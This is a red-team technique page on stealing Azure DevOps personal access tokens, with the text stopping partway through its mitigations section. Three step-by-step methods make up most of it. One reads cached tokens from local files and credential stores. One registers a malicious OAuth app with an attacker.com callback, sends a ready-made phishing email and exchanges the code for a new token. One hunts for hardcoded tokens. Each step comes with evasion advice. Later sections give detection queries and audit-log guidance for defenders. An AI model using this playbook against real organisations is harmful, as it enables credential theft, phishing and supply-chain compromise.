# [CA-TOKEN-008]: Azure DevOps Personal Access Token (PAT) Theft

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-008 |
| **MITRE ATT&CK v18.1** | [T1528: Steal Application Access Tokens](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, Azure DevOps, Cross-Platform |
| **Severity** | **Critical** |
| **CVE** | CVE-2023-21540 (Electron local privilege escalation) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Azure DevOps Services (all versions), Azure DevOps Server 2019-2022 |
| **Patched In** | N/A (PAT design inherent; mitigations available) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note**: Sections 6 (Atomic Red Team) and 8 (Splunk Detection Rules) are dynamically included. Section 11 (Sysmon Detection) not included because PAT theft is primarily a cloud-based attack with limited endpoint signals. All section numbers have been renumbered based on applicability.

---

## 2. Executive Summary

Azure DevOps Personal Access Tokens (PATs) are long-lived, bearer-token credentials that grant repository, pipeline, and organizational access without requiring password authentication. When compromised, a PAT becomes a golden credential for lateral movement, supply chain attacks, and persistent access to an organization's source code, deployment pipelines, and secrets management systems.

**Attack Surface**: PATs cached in local filesystem (`%USERPROFILE%\.azure` on Windows, `~/.azure` on Linux/Mac), hardcoded in scripts, transmitted via phishing, or generated through OAuth consent phishing attacks targeting developers with high privilege levels.

**Business Impact**: **Loss of source code integrity, supply chain compromise, credential harvesting from CI/CD pipelines, and lateral movement into Azure subscriptions via stolen service principal credentials**. A compromised developer's PAT can grant an attacker the same repository and pipeline permissions as that developer, including the ability to commit malicious code, modify CI/CD workflows to steal secrets, and execute arbitrary code in build agents.

**Technical Context**: PAT theft typically requires either (1) initial endpoint compromise with local filesystem access, (2) successful phishing of a developer, or (3) discovery of hardcoded PATs in repositories or configuration files. Once obtained, the token can be used immediately from any network location without triggering additional authentication or MFA prompts, making it highly effective for persistence and lateral movement.

### Operational Risk

- **Execution Risk:** **High** – Once a PAT is obtained, an attacker has immediate, privileged access to Azure DevOps without requiring additional exploitation steps.
- **Stealth:** **Medium** – PAT usage generates audit logs in Azure DevOps; however, an attacker can obfuscate activity by blending legitimate developer workflows. Unusual repository commits or pipeline modifications may trigger alerts if properly monitored.
- **Reversibility:** **No** – Malicious code committed with a stolen PAT is difficult to fully remediate; the attacker may have already extracted secrets or triggered downstream supply chain compromises.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.1 | Authentication Method Configuration – PAT creation and usage controls |
| **DISA STIG** | SRG-APP-000231-WSR-000086 | Token Handling and Credential Management in Web Applications |
| **CISA SCuBA** | SC-7(8) | Boundary Protection – Control of credential transmission in cloud environments |
| **NIST 800-53** | SC-7(8) / IA-5(1) | Boundary Protection and Password-based Authentication |
| **GDPR** | Article 32 | Security of Processing – Encryption and access controls on credentials |
| **DORA** | Article 9 | Protection and Prevention – ICT Security measures for critical operations |
| **NIS2** | Article 21 | Cyber Risk Management Measures – Identity and access controls |
| **ISO 27001** | A.9.2.2 / A.14.2.1 | User Access and Authentication; Secure Development Requirements |
| **ISO 27005** | Risk Scenario: "Compromise of Authentication Credentials" | Access control and cryptography |

---

## 3. Technical Prerequisites

- **Required Privileges:** Any Azure DevOps user with repository access; high-impact attacks require developer or project admin privileges.
- **Required Access:** Either (1) local filesystem access to a compromised endpoint running Azure DevOps CLI, (2) network access to phishing infrastructure, or (3) ability to discover hardcoded PATs in repositories.

**Supported Versions:**
- **Azure DevOps Services:** All versions (SaaS)
- **Azure DevOps Server:** 2019, 2020, 2022, 2025
- **PowerShell:** 5.0+ (Windows)
- **Azure CLI:** 2.0+ with Azure DevOps extension
- **Git:** 2.0+

**Tools:**
- [Azure DevOps CLI](https://learn.microsoft.com/en-us/azure/devops/cli/) (Official Microsoft)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Official Microsoft)
- [Evilginx2](https://github.com/kgretzky/evilginx2) (OAuth phishing proxy)
- [ROADtools](https://github.com/dirkjanm/ROADtools) (Azure/Entra ID enumeration with tokens)
- [GraphRunner](https://github.com/dafthack/GraphRunner) (Microsoft Graph API exploitation)

---

## 4. Environmental Reconnaissance

### Management Station / PowerShell Reconnaissance

```powershell
# Check if Azure DevOps CLI is installed
az version

# Determine if PAT is cached locally
Get-Item -Path "$env:USERPROFILE\.azure" -ErrorAction SilentlyContinue
Get-Item -Path "$env:USERPROFILE\.azure\defaults" -ErrorAction SilentlyContinue

# List cached Azure credentials (if stored)
$CredPath = "$env:USERPROFILE\.azure"
if (Test-Path $CredPath) {
    Get-ChildItem -Path $CredPath -Force
}
```

**What to Look For:**
- Presence of `.azure` directory indicates Azure CLI/DevOps usage on the system.
- Files within the directory may contain cached credentials or configuration.
- If a `devops` file exists, it may contain a cached PAT or token.

**Version Note:** Behavior is consistent across PowerShell 5.0 and PowerShell 7.x.

### Linux/Bash CLI Reconnaissance

```bash
# Check Azure CLI installation and version
az version

# Check for cached credentials in Linux/Mac user home
ls -la ~/.azure/

# List contents of DevOps configuration
cat ~/.azure/devops 2>/dev/null || echo "No cached DevOps credential found"

# Check for PATs in bash history (security risk indicator)
grep -r "pat\|token\|PAT" ~/.bash_history 2>/dev/null | head -20
```

**What to Look For:**
- Presence of `~/.azure/defaults` or `~/.azure/devops` indicates cached credentials.
- Entries in `~/.bash_history` containing PAT references indicate previous usage.

---

## 5. Detailed Execution Methods

### METHOD 1: PAT Discovery in Cached Credentials (Post-Compromise)

**Supported Versions:** Azure DevOps Services and Server 2019+

#### Step 1: Enumerate Cached Credentials on Compromised Endpoint

**Objective:** Discover cached Azure DevOps credentials stored locally on a compromised endpoint.

**Command (Windows):**

```powershell
# List all files in .azure directory
Get-ChildItem -Path "$env:USERPROFILE\.azure" -Force -Recurse

# Check for devops configuration file
$DevOpsPath = "$env:USERPROFILE\.azure\devops"
if (Test-Path $DevOpsPath) {
    Get-Content $DevOpsPath
}

# Alternatively, check for git credentials helper
git config --global credential.helper
git config --system credential.helper
```

**Command (Linux/Mac):**

```bash
# List all cached Azure configuration
ls -la ~/.azure/

# Display contents of devops configuration
cat ~/.azure/devops

# Check git credential storage
git config --global credential.helper
```

**Expected Output:**
```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2025-01-08  14:23                .
d-----         2025-01-08  14:23                ..
-a----         2025-01-08  14:22            2048  defaults
-a----         2025-01-07  09:15            1024  devops
```

**What This Means:**
- **devops file**: Contains configuration referencing cached tokens or PAT details.
- **defaults file**: Contains organization URL and authentication method preferences.
- If credentials are cached, the attacker can use them directly.

**OpSec & Evasion:**
- Direct read of `.azure` directory is **Low Detection Risk** if performed during normal user activity.
- If the environment has EDR, file access to `.azure` directory may generate alerts; perform reads during high-volume activity periods to blend in.
- Avoid excessive directory enumeration; perform targeted reads.
- Detection Likelihood: **Medium** (EDR-dependent).

**Troubleshooting:**
- **Error:** `.azure directory not found`
  - **Cause:** User has never configured Azure DevOps CLI; no cached credentials.
  - **Fix (Windows):** Proceed to METHOD 2 (phishing or hardcoded discovery).
  - **Fix (Linux):** Check `~/.config/` or `~/.local/` for alternative credential storage.

**References & Proofs:**
- [Azure DevOps CLI Documentation](https://learn.microsoft.com/en-us/azure/devops/cli/log-in-via-pat)
- [With Secure: Performing and Preventing Attacks on Azure DevOps](https://labs.withsecure.com/publications/performing-and-preventing-attacks-on-azure-devops)

---

#### Step 2: Steal PAT from Cached Storage or Environment Variables

**Objective:** Extract the cached PAT and authenticate to Azure DevOps.

**Command (Windows - Extract PAT):**

```powershell
# Method 1: Direct file read from .azure directory
$AzureDir = "$env:USERPROFILE\.azure"
$PAT = Get-Content "$AzureDir\devops" -ErrorAction SilentlyContinue

# Method 2: Extract from git-credential-manager if used
# Git credentials are sometimes stored in the Windows Credential Manager
cmdkey /list | Select-String "git\|azure\|devops" -IgnoreCase

# Method 3: Query Windows Credential Manager directly
# Using CredentialManager module (if available)
if (Get-Module -ListAvailable -Name "CredentialManager") {
    Get-StoredCredential | Where-Object { $_.Target -like "*azure*" -or $_.Target -like "*devops*" }
}

# Display the PAT value (if retrieved)
$PAT
```

**Command (Linux - Extract PAT):**

```bash
# Method 1: Direct file read
PAT=$(cat ~/.azure/devops 2>/dev/null)
echo "$PAT"

# Method 2: Check for git-credential-manager cache
if [ -f ~/.config/git-credentials ]; then
    cat ~/.config/git-credentials
fi

# Method 3: Search for PAT references in shell configuration
grep -r "AZURE_DEVOPS_PAT\|PAT\|TOKEN" ~/.bashrc ~/.zshrc ~/.profile 2>/dev/null
```

**Expected Output:**

```
abcdefghijklmnopqrstuvwxyz1234567890abcd
```

(A 52-character alphanumeric PAT)

**What This Means:**
- The output is a valid Azure DevOps PAT.
- This token can now be used to authenticate to the Azure DevOps organization.
- The token inherits the permissions of the original owner.

**OpSec & Evasion:**
- Reading cached credentials is **Low Risk** if using standard system APIs.
- Exfiltrating the PAT off the compromised system requires network egress detection; consider encrypting or encoding the token before transmission.
- Use `stdout` redirection instead of file writes to avoid disk artifacts.
- Detection Likelihood: **Low-Medium** (depends on DPAPI/credential manager monitoring).

**Troubleshooting:**
- **Error:** `Access denied` when reading `.azure/devops`
  - **Cause:** File permissions restrict non-owner access.
  - **Fix:** Escalate privileges or run as the credential-owning user.

**References & Proofs:**
- [Azure CLI Credential Management](https://learn.microsoft.com/en-us/azure/devops/cli/log-in-via-pat)
- [Microsoft Credential Manager Documentation](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-manager/credential-manager-overview)

---

#### Step 3: Authenticate to Azure DevOps Using Stolen PAT

**Objective:** Use the stolen PAT to authenticate and gain access to Azure DevOps repositories and pipelines.

**Command (Windows):**

```powershell
# Option 1: Using az devops login
$PAT = "abcdefghijklmnopqrstuvwxyz1234567890abcd"  # Stolen PAT
$OrgURL = "https://dev.azure.com/contoso"

# Authenticate using the stolen PAT
$PAT | az devops login --organization $OrgURL

# Verify successful authentication
az devops project list --organization $OrgURL
```

**Command (Linux/Mac):**

```bash
# Authenticate using stolen PAT
PAT="abcdefghijklmnopqrstuvwxyz1234567890abcd"
ORG_URL="https://dev.azure.com/contoso"

echo "$PAT" | az devops login --organization $ORG_URL

# Verify authentication
az devops project list --organization $ORG_URL
```

**Expected Output:**

```
[
  {
    "id": "12345678-1234-1234-1234-123456789012",
    "name": "Project1",
    "state": "wellFormed",
    "visibility": "private"
  },
  {
    "id": "87654321-4321-4321-4321-210987654321",
    "name": "Project2",
    "state": "wellFormed",
    "visibility": "private"
  }
]
```

**What This Means:**
- Authentication succeeded.
- The attacker now has the same access as the original PAT owner.
- All projects accessible by the stolen PAT are enumerated.

**OpSec & Evasion:**
- Using `az devops login` generates audit log entries (see Detection section).
- Consider using the PAT directly in Git commands (git clone, git push) which may blend in with normal developer activity.
- Perform reconnaissance and data theft during off-hours if possible.
- Detection Likelihood: **High** (every az devops command logs; Git usage via PAT also audited).

**Troubleshooting:**
- **Error:** `Invalid PAT or organization URL`
  - **Cause:** PAT has been revoked or organization URL is incorrect.
  - **Fix (Windows):** Verify the organization URL matches the DevOps instance; check if PAT is still valid in Azure DevOps.
  - **Fix (Linux):** Same troubleshooting approach.

**References & Proofs:**
- [Azure DevOps CLI Authentication](https://learn.microsoft.com/en-us/azure/devops/cli/log-in-via-pat)
- [Using PAT for Git Authentication](https://learn.microsoft.com/en-us/azure/devops/repos/git/auth-overview?tabs=ssh)

---

### METHOD 2: PAT Generation via OAuth Consent Phishing

**Supported Versions:** Azure DevOps Services (all versions); Azure DevOps Server 2019+

#### Step 1: Create Malicious OAuth App Registration

**Objective:** Register an Azure AD application that requests PAT management permissions.

**Command (PowerShell - Using Microsoft Graph):**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# Create an OAuth app that requests broad permissions
$params = @{
    displayName = "DevOps PAT Manager"
    signInAudience = "AzureADMultipleOrgs"
    
    requiredResourceAccess = @(
        @{
            resourceAppId = "00000002-0000-0ff1-ce00-000000000000"  # Azure DevOps
            resourceAccess = @(
                @{
                    id = "a454db0d-2e22-4f74-acf7-1d5ec2826b9e"
                    type = "Scope"  # app_password scope
                }
            )
        },
        @{
            resourceAppId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph
            resourceAccess = @(
                @{
                    id = "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"
                    type = "Role"  # User.ReadWrite.All
                }
            )
        }
    )
    
    web = @{
        redirectUris = @("https://attacker.com/callback", "https://localhost:3000/callback")
    }
}

# Register the app
$app = New-MgApplication @params
$AppId = $app.AppId

Write-Host "Created App Registration: $AppId"
```

**Expected Output:**

```
Created App Registration: 11111111-2222-3333-4444-555555555555
```

**What This Means:**
- An Azure AD application has been registered with a specific AppId.
- The application requests permissions to generate and manage Azure DevOps PATs.
- This app can be used in a phishing consent flow.

**OpSec & Evasion:**
- Register the app in a tenant controlled by the attacker or a compromised tenant.
- Use a realistic display name to deceive users (e.g., "Microsoft DevOps Tools" or "Azure Pipelines Manager").
- Use multiple tenant IDs and app IDs to distribute the attack across infrastructure.
- Detection Likelihood: **Medium** (Azure AD logs all app registrations; monitoring for unusual app permissions flags this).

**Troubleshooting:**
- **Error:** "Insufficient privileges to register application"
  - **Cause:** The attacker's account does not have Application Administrator role.
  - **Fix:** Use an account with global admin or application administrator privileges.

**References & Proofs:**
- [Microsoft Graph Application Registration API](https://learn.microsoft.com/en-us/graph/api/application-post-applications)
- [Azure DevOps OAuth Scopes](https://learn.microsoft.com/en-us/azure/devops/integrate/get-started/authentication/oauth)

---

#### Step 2: Craft Phishing Email with OAuth Consent URL

**Objective:** Create a phishing email that directs the victim to an OAuth consent page.

**Phishing Email Example:**

```
Subject: Urgent: Re-authorize Azure DevOps Access

Hi [Developer Name],

Your Azure DevOps authentication has expired. Please click the button below to re-authorize your access immediately. 
This is required to maintain continuity with ongoing pipeline deployments.

AUTHENTICATE HERE: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
client_id=11111111-2222-3333-4444-555555555555&
redirect_uri=https://attacker.com/callback&
response_type=code&
scope=https%3A%2F%2Fdev.azure.com%2Fapp_password&
state=random_state_value&
prompt=consent

This is a time-sensitive request.

Azure DevOps Security Team
```

**What This URL Does:**
- Directs the victim to Microsoft's OAuth authorization endpoint.
- Requests the `app_password` scope (PAT management) on behalf of the attacker's app.
- If the victim grants consent, the attacker's app receives an authorization code, which can be exchanged for a refresh token and access token.

**OpSec & Evasion:**
- The URL uses Microsoft's legitimate OAuth endpoint (login.microsoftonline.com), increasing legitimacy.
- Use email spoofing or compromised Microsoft accounts to increase credibility.
- Include false urgency or technical language to pressure compliance.
- Avoid suspicious URL shorteners; use full URLs or the official Microsoft domain.
- Detection Likelihood: **Medium-High** (legitimate OAuth flows are logged; but phishing emails may bypass email filters if convincing).

**References & Proofs:**
- [OAuth 2.0 Authorization Code Flow](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow)
- [SquarePhish GitHub (Real-World Phishing Kit)](https://github.com/secureworks/squarephish)

---

#### Step 3: Exchange Authorization Code for PAT

**Objective:** When the victim grants consent, exchange the authorization code for a token that can create PATs.

**Command (Python - Attacker Backend):**

```python
import requests
import json

# After victim clicks "Approve" on consent screen, attacker receives authorization code
AUTH_CODE = "M.R3_BAY.abcdefg..."  # Received from OAuth redirect
CLIENT_ID = "11111111-2222-3333-4444-555555555555"
CLIENT_SECRET = "super_secret_key_registered_in_app"  # Attacker's app secret
TENANT_ID = "victim_tenant_id"
REDIRECT_URI = "https://attacker.com/callback"

# Exchange authorization code for access token
token_url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
token_payload = {
    "client_id": CLIENT_ID,
    "client_secret": CLIENT_SECRET,
    "code": AUTH_CODE,
    "redirect_uri": REDIRECT_URI,
    "grant_type": "authorization_code",
    "scope": "https://dev.azure.com/app_password"
}

response = requests.post(token_url, data=token_payload)
token_response = response.json()

access_token = token_response.get("access_token")
refresh_token = token_response.get("refresh_token")

print(f"[+] Access Token: {access_token}")
print(f"[+] Refresh Token (long-lived): {refresh_token}")

# Now, use the access token to create a PAT on behalf of the victim
# via Azure DevOps PAT creation API
create_pat_url = "https://vssps.dev.azure.com/{organization}/_apis/tokens/pats"
headers = {
    "Authorization": f"Bearer {access_token}",
    "Content-Type": "application/json"
}

pat_payload = {
    "displayName": "Build Agent Token",
    "validTo": "2026-01-08T00:00:00Z",
    "scope": ["vso.build", "vso.code", "vso.release"]  # Grant repository and pipeline access
}

pat_response = requests.post(create_pat_url, json=pat_payload, headers=headers)
created_pat = pat_response.json()

print(f"[+] Created PAT: {created_pat['token']}")
```

**Expected Output:**

```
[+] Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
[+] Refresh Token (long-lived): 0.ARwA6WgJV3Z...
[+] Created PAT: abcdefghijklmnopqrstuvwxyz1234567890abcd
```

**What This Means:**
- The attacker has successfully generated a PAT in the victim's name with the victim's permissions.
- The PAT is now in the attacker's possession and can be used immediately.
- The refresh token allows the attacker to generate new access tokens if the initial token expires.

**OpSec & Evasion:**
- Use a bulletproof hosting provider for the callback endpoint.
- Encrypt the authorization code and token in transit.
- Avoid logging sensitive tokens in plaintext; use hash-based logging.
- Consider implementing a multi-stage attack where tokens are extracted in a separate step.
- Detection Likelihood: **High** (Azure DevOps audit logs all PAT creations; the creation will show the attacker's app as the creator).

**Troubleshooting:**
- **Error:** "Invalid authorization code"
  - **Cause:** Code has expired or is incorrect.
  - **Fix:** Verify the code format and ensure the authorization request completed successfully.

**References & Proofs:**
- [Azure DevOps PAT Management API](https://learn.microsoft.com/en-us/azure/devops/integrate/get-started/authentication/tokens-and-keys)
- [OAuth 2.0 Token Exchange](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow)

---

### METHOD 3: Hardcoded PAT Discovery in Source Code

**Supported Versions:** Azure DevOps Services and Server 2019+ with git-based repositories

#### Step 1: Clone Repository and Search for Hardcoded PATs

**Objective:** Search repository history for hardcoded PATs.

**Command (Windows):**

```powershell
# Clone the Azure DevOps repository using exposed PAT
$PAT = "hardcodedpatunearthed"
$Org = "https://dev.azure.com/targetorg"
$Project = "TargetProject"
$Repo = "TargetRepo"

$RepoURL = "$Org/$Project/_git/$Repo"

# Use git to clone (PAT in URL)
git clone https://$PAT@dev.azure.com/targetorg/TargetProject/_git/TargetRepo

# Search for additional PATs in the repository
cd TargetRepo

# Search for PAT patterns in files
Get-ChildItem -Recurse | Select-String -Pattern "pat.*=|token.*=|key.*=.*dev\.azure\.com" | Select-Object Path, Line | Format-Table
```

**Command (Linux/Bash):**

```bash
# Clone the repository
PAT="hardcodedpatunearthed"
git clone https://$PAT@dev.azure.com/targetorg/TargetProject/_git/TargetRepo

cd TargetRepo

# Search for hardcoded PATs using grep
grep -r "pat\|PAT\|token\|TOKEN" . --include="*.py" --include="*.js" --include="*.cs" --include="*.java" --include="*.config" --include="*.json" --include="*.yml" --include="*.yaml" | grep -i "dev\.azure\.com\|devops\|authentication"
```

**Expected Output:**

```
config/azure-devops.json:  "pat": "pjv2jpl5mq2dqxxvsmrsq3z5p7zw4hcjwvgq7e3yq6t5u4v3w2x1y0z9a8b7c6d"
scripts/build.sh:  export AZURE_PAT="abc123def456ghi789jkl012mno345pqr678stu"
README.md: "Use the PAT 'pjv2jpl5mq...' for CI/CD pipelines"
```

**What This Means:**
- Hardcoded PATs have been discovered in configuration files, scripts, and documentation.
- These PATs may be active and can be used immediately.
- The scope of the PAT depends on its creation settings.

**OpSec & Evasion:**
- Clone the repository and perform searches locally to avoid generating unusual web traffic.
- Search in git history using `git log -S` for PAT patterns in previous commits.
- Combine PAT discovery with further enumeration to identify the highest-privilege accounts.
- Detection Likelihood: **Low-Medium** (repository cloning is normal; searching for PATs is not directly logged).

**Troubleshooting:**
- **Error:** `Repository not found`
  - **Cause:** The PAT does not have repository access or the URL is incorrect.
  - **Fix:** Verify the organization, project, and repository names; check PAT scope in Azure DevOps.

**References & Proofs:**
- [GitLeaks GitHub (PAT Pattern Detection)](https://github.com/gitleaks/gitleaks)
- [Azure DevOps Repository Cloning](https://learn.microsoft.com/en-us/azure/devops/repos/git/clone)

---

## 6. Atomic Red Team

**Atomic Test ID:** T1528-002 (Azure – Functions code upload)

**Test Name:** Steal Application Access Token – Azure Functions code injection via Blob upload

**Description:** Simulates stealing an access token from an Azure Function environment by injecting code into a Function App, which then exfiltrates the IMDS (Instance Metadata Service) token to an attacker-controlled endpoint.

**Supported Versions:** Azure DevOps Services, Azure Functions; PowerShell 5.0+

**Execution:**

```powershell
# Step 1: Install Atomic Red Team framework
Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/archive/refs/heads/master.zip" -OutFile "atomic-red-team.zip"
Expand-Archive -Path "atomic-red-team.zip"

cd atomic-red-team-master/atomics/T1528

# Step 2: Execute Atomic Test #2 (Token theft from Azure Functions)
Invoke-AtomicTest T1528 -TestNumbers 2
```

**Cleanup Command:**

```powershell
Remove-AzFunctionApp -ResourceGroupName "TargetResourceGroup" -Name "TestFunctionApp"
```

**Reference:** [Atomic Red Team T1528 Azure Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md)

---

## 7. Tools & Commands Reference

### [Azure DevOps CLI](https://learn.microsoft.com/en-us/azure/devops/cli/)

**Version:** 2.0+  
**Supported Platforms:** Windows, Linux, macOS  
**Minimum Version:** 2.0  

**Version-Specific Notes:**
- Version 2.0-2.5: Basic authentication with PAT only.
- Version 2.6+: Support for device code flow and service principal authentication (alternative to PAT).

**Installation:**

```bash
# Windows (via scoop or chocolatey)
scoop install azure-devops-cli

# Linux (via pip)
pip install azure-devops-cli

# macOS (via brew)
brew install azure-devops-cli
```

**Usage:**

```bash
# Authenticate with a PAT
az devops login --organization https://dev.azure.com/myorg --use-pat-token

# When prompted, enter the PAT

# List projects
az devops project list

# List repositories
az devops repo list --project MyProject

# Clone a repository
az devops repo show --repo-id <repo_id> --project MyProject
```

### Script: Automated PAT Enumeration

```python
#!/usr/bin/env python3
import os
import json
import subprocess
from pathlib import Path

def find_cached_pats():
    """Enumerate cached Azure DevOps PATs on the system."""
    
    # Platform-specific paths
    if os.name == 'nt':  # Windows
        azure_dir = Path.home() / '.azure'
    else:  # Linux/Mac
        azure_dir = Path.home() / '.azure'
    
    pats = []
    
    if azure_dir.exists():
        for file in azure_dir.iterdir():
            if file.is_file():
                try:
                    with open(file, 'r') as f:
                        content = f.read()
                        if len(content) > 40 and len(content.split('\n')[0]) > 40:
                            pats.append({
                                'file': str(file),
                                'token': content.split('\n')[0][:20] + '...'
                            })
                except Exception as e:
                    print(f"[!] Error reading {file}: {e}")
    
    return pats

def test_pat_validity(pat, org_url):
    """Test if a PAT is valid by attempting to list projects."""
    
    try:
        result = subprocess.run([
            'az', 'devops', 'project', 'list',
            '--organization', org_url
        ], env={**os.environ, 'AZURE_DEVOPS_EXT_PAT': pat}, 
        capture_output=True, text=True, timeout=10)
        
        return result.returncode == 0
    except Exception as e:
        return False

if __name__ == '__main__':
    print("[*] Scanning for cached Azure DevOps PATs...")
    pats = find_cached_pats()
    
    for pat_info in pats:
        print(f"[+] Found potential PAT: {pat_info['file']}")
        print(f"    Token (truncated): {pat_info['token']}")
```

---

## 8. Microsoft Sentinel Detection

### KQL Query 1: Detect Unusual Azure DevOps CLI Usage

**Rule Configuration:**
- **Required Table:** AuditLogs, SigninLogs
- **Required Fields:** AppDisplayName, UserAgent, OperationName, TargetResources
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Azure DevOps Services (all versions)

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Create personal access token", "Create personal access token (session token)")
| where InitiatedBy.user.userPrincipalName != "" or InitiatedBy.user.servicePrincipalName != ""
| project TimeGenerated, InitiatedBy, OperationName, TargetResources, Result
| summarize TokenCount = count() by InitiatedBy.user.userPrincipalName
| where TokenCount > 3  // Threshold: more than 3 PATs created in short timeframe
```

**What This Detects:**
- Rapid creation of multiple PATs by a single user (possible compromise).
- Unusual PAT creation outside normal business hours or by unexpected accounts.
- The `OperationName` specifically tracks PAT creation events.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Unusual Azure DevOps PAT Creation`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**Source:** [Microsoft Sentinel Azure DevOps Audit Logs](https://learn.microsoft.com/en-us/azure/devops/organizations/audit/azure-devops-auditing-feature-overview)

---

### KQL Query 2: Detect PAT Usage from Unusual Locations

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** UserPrincipalName, IPAddress, DeviceDetail, AppDisplayName
- **Alert Severity:** Medium
- **Frequency:** Run every 10 minutes

**KQL Query:**

```kusto
SigninLogs
| where AppDisplayName == "Azure DevOps"
| where ResultType == 0  // Successful sign-ins only
| join kind=leftouter (SigninLogs
    | where AppDisplayName == "Azure DevOps"
    | summarize AvgLatitude = avg(tolower(tostring(parse_json(LocationDetails).geoCoordinates.latitude))) by UserPrincipalName) on UserPrincipalName
| where isnan(AvgLatitude) or abs(tolower(tostring(parse_json(LocationDetails).geoCoordinates.latitude)) - AvgLatitude) > 1000  // Geographically impossible distance
| project TimeGenerated, UserPrincipalName, IPAddress, parse_json(LocationDetails).countryOrRegion
```

**What This Detects:**
- Azure DevOps sign-ins from geographically impossible locations (token replay/theft).
- Unusual IP addresses compared to baseline user behavior.
- PAT usage from VPNs or proxy servers not typical for the user.

**Source:** [MITRE ATT&CK - T1528 Detection](https://attack.mitre.org/techniques/T1528/)

---

## 9. Windows Event Log Monitoring

**Event ID: 4624 (Successful Account Logon)**

- **Log Source:** Security Event Log
- **Trigger:** PAT-based authentication to Azure DevOps CLI generates a successful logon event if integrated with Windows authentication.
- **Filter:** Look for `Logon Type 9` (network) with `New Logon Account Name` matching service accounts or developer accounts.
- **Applies To Versions:** Windows Server 2016+, Windows 10/11

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Logon/Logoff**
3. Enable: **Audit Other Logon/Logoff Events**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy - Server 2022+):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Logon/Logoff**
3. Enable: **Audit Logon**
4. Run `auditpol /set /subcategory:"Logon" /success:enable /failure:enable`

---

## 10. Microsoft Defender for Cloud

**Alert Name:** `Suspicious sign-in activity from an unfamiliar location`

- **Severity:** High
- **Description:** Azure DevOps PAT usage from a location not associated with the user's baseline.
- **Applies To:** All Azure DevOps Services subscriptions with Defender for Cloud enabled
- **Remediation:**
  1. Revoke the compromised PAT immediately
  2. Reset the user's password
  3. Review audit logs for other suspicious activities
  4. Enable MFA for the affected account

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Cloud Apps**: ON
   - **Defender for DevOps**: ON (Preview)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

**Reference:** [Microsoft Defender for Cloud - Threat Detection](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-overview)

---

## 11. Microsoft Purview (Unified Audit Log)

**Operation:** `Create personal access token`

**PowerShell Query:**

```powershell
Connect-ExchangeOnline
Search-UnifiedAuditLog -Operations "CreatePersonalAccessToken" -StartDate (Get-Date).AddDays(-1) -EndDate (Get-Date) -ResultSize 5000 | Export-Csv -Path "C:\AuditLogs\PAT_Creation.csv"
```

- **Operation:** CreatePersonalAccessToken, RevokePersonalAccessToken
- **Workload:** AzureDevOps
- **Details:** AuditData blob contains:
  - `UserId`: Account that created/revoked the token
  - `OrganizationId`: Azure DevOps organization
  - `DisplayName`: Token display name
  - `Scope`: PAT scopes granted (e.g., vso.build, vso.code)
  - `ExpirationDate`: When the token expires
- **Applies To:** All Azure DevOps organizations

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate

**Manual Configuration Steps (Search Audit Logs):**

1. Go to **Audit** → **Search**
2. Set **Date range** (Start/End)
3. Under **Activities**, select: **Create personal access token**
4. Under **Users**, enter: **[Affected user UPN or leave blank for all]**
5. Click **Search**
6. Export results: **Export** → **Download all results**

---

## 12. Defensive Mitigations

### Priority 1: CRITICAL

**Mitigation 1: Enforce PAT Expiration Policies**

Azure DevOps supports enforcing mandatory PAT expiration. This prevents indefinite use of stolen tokens.

**Applies To Versions:** Azure DevOps Services 2022+, Azure DevOps Server 2022+

**Manual Steps (Azure DevOps Admin Portal):**

1. Go to **Azure DevOps Portal** → **Organization Settings** (bottom left corner)
2. Navigate to **Security** → **Policies**
3. Under **Personal Access Token (PAT) Policies**, set:
   - **Maximum age of personal access tokens**: `30 days` (recommended)
   - **Inactive timeout policy**: `14 days`
4. Click **Save**

**Manual Steps (PowerShell):**
